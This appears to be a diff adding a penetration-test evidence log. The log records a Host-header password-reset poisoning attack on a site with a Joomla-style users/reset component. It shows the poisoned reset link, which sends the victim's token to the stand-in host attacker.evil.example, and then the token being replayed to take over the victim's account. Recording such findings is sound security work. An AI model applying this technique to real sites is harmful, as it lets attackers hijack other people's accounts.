@@ -1,0 +1,11 @@
+reset.request (Host: attacker.evil.example) -> HTTP 303, Location http://attacker.evil.example/index.php/component/users/reset?layout=confirm
+
+Captured victim reset email link (POISONED):
+  http://attacker.evil.example/index.php/component/users/reset?layout=confirm&token=534f855468bfc7c891aa54328bbeea00
+  ^ host is the ATTACKER's, token is the victim's REAL single-use reset token.
+
+After replaying token via reset.confirm + reset.complete on the real host:
+  - victim's stored password hash CHANGED
+  - attacker logged in as the victim with the attacker-set password  => ACCOUNT TAKEOVER
+
+(Full captured email in evidence/poisoned_reset_mail.eml)
